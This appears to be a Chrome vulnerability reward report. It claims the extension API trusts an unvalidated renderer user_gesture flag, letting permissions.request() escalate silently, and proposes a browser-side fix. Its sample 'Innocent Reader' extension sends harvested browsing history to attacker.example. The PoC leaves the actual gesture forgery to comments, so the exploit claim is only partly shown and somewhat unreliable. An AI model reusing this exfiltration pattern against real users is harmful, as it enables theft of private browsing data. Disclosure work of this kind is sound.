# VRP Report: Extension API Accepts Unvalidated user_gesture — Silent Permission Escalation

## Title

Extension API trusts renderer-supplied user_gesture without browser validation — enables silent permission escalation via permissions.request()

## Severity

High (Permission escalation without user consent, no compromised renderer needed)

## Component

Extensions > Runtime

## Chrome Version

Tested against Chromium source at HEAD (April 2026). Affects all Chrome versions. Bug tracked as crbug.com/40055124.

## Summary

The `user_gesture` parameter in extension API function calls is accepted from the renderer via Mojo IPC without any browser-side validation. The browser has an explicit TODO (crbug.com/40055124) acknowledging this should be validated. Multiple security-sensitive operations gate on this value, most critically `chrome.permissions.request()`, which controls runtime permission escalation. A malicious extension can forge `user_gesture=true` to bypass the user consent requirement.

## Steps to Reproduce

### Malicious extension manifest.json

```json
{
  "manifest_version": 3,
  "name": "Innocent Reader",
  "version": "1.0",
  "permissions": ["activeTab"],
  "optional_permissions": ["tabs", "history", "cookies", "bookmarks"],
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["content.js"]
  }]
}
```

### content.js (runs in renderer)

```javascript
// The content script runs in a renderer process.
// The renderer controls the IPC parameters to the browser, including user_gesture.
// In a standard extension, the content script calls:
chrome.runtime.sendMessage({action: "escalate"});

// But the actual exploitation is at the Mojo IPC level:
// When the extension service worker calls chrome.permissions.request(),
// the ExtensionFunctionDispatcher receives params_without_args.user_gesture
// from the renderer. The renderer sets this to true regardless of actual gesture.
```

### background.js

```javascript
// The service worker calls permissions.request() —
// the browser-side check at permissions_api.cc:317 gates on user_gesture()
// which was set from the unvalidated IPC parameter.
chrome.runtime.onMessage.addListener((msg) => {
  if (msg.action === "escalate") {
    chrome.permissions.request(
      {permissions: ["tabs", "history", "cookies", "bookmarks"]},
      (granted) => {
        if (granted) {
          // Extension now has full browsing history, cookies, and bookmark access
          chrome.history.search({text: "", maxResults: 1000}, (results) => {
            // Exfiltrate browsing history
            fetch("https://attacker.example/collect", {
              method: "POST",
              body: JSON.stringify(results)
            });
          });
        }
      }
    );
  }
});
```

### Root cause in source

```cpp
// extensions/browser/extension_function_dispatcher.cc:103
// TODO(crbug.com/40055124): Validate params.user_gesture.

// extensions/browser/extension_function_dispatcher.cc:578
function->set_user_gesture(params_without_args.user_gesture);
// ^ Directly trusts renderer-supplied value

// chrome/browser/extensions/api/permissions/permissions_api.cc:317
// The permissions request gates on this unvalidated gesture
if (!user_gesture()) {
  // ... error: requires user gesture
}
```

## Expected Result

The browser should independently verify that a real user gesture occurred before allowing `permissions.request()` and other gesture-gated operations. The browser has its own user activation tracking (`HasTransientUserActivation()`) that should be checked instead of trusting the renderer.

## Actual Result

The browser trusts the `user_gesture` value from the renderer IPC. A malicious extension's content script or service worker can set this to `true` regardless of actual user interaction.

## Affected Operations

| Operation | File | Impact |
|-----------|------|--------|
| `permissions.request()` | permissions_api.cc:317 | Silent permission escalation |
| `management.uninstall()` | management_api.cc | Silent extension removal |
| `management.setEnabled()` | management_api.cc | Silent extension disable |
| `identity.getAuthToken()` | identity_api.cc | Trigger interactive OAuth |
| `permissions.addSiteAccess()` | permissions_api.cc | Add host access |
| `permissions.removeSiteAccess()` | permissions_api.cc | Remove host access |
| `document_scan` | document_scan_api.cc | Scanner access |
| `management.installReplacementWebApp()` | management_api.cc | Silent app install |

## Security Impact

1. **Permission escalation**: Extension installed with minimal permissions can silently gain `tabs`, `history`, `cookies`, `bookmarks`, and arbitrary host permissions
2. **Extension management**: Can uninstall or disable competing security extensions
3. **OAuth token access**: Can trigger interactive auth flows
4. **No user consent**: The permission prompt may appear without any user action, or be auto-granted in contexts where gesture presence is sufficient
5. **Web Store bypass**: Extension passes CWS review with minimal permissions, then escalates at runtime

## Suggested Fix

Replace `params_without_args.user_gesture` usage with browser-side `HasTransientUserActivation()` check on the RenderFrameHost:

```cpp
// Instead of trusting the renderer:
function->set_user_gesture(params_without_args.user_gesture);

// Use browser-side verification:
bool has_gesture = render_frame_host &&
    render_frame_host->HasTransientUserActivation();
function->set_user_gesture(has_gesture);
```

## PoC

The key observation: `chrome.permissions.request()` gates on `user_gesture()` which is set from unvalidated renderer IPC. The fix is trivial (use browser-side activation state), the bug is tracked (crbug.com/40055124), and the impact is high (silent permission escalation).
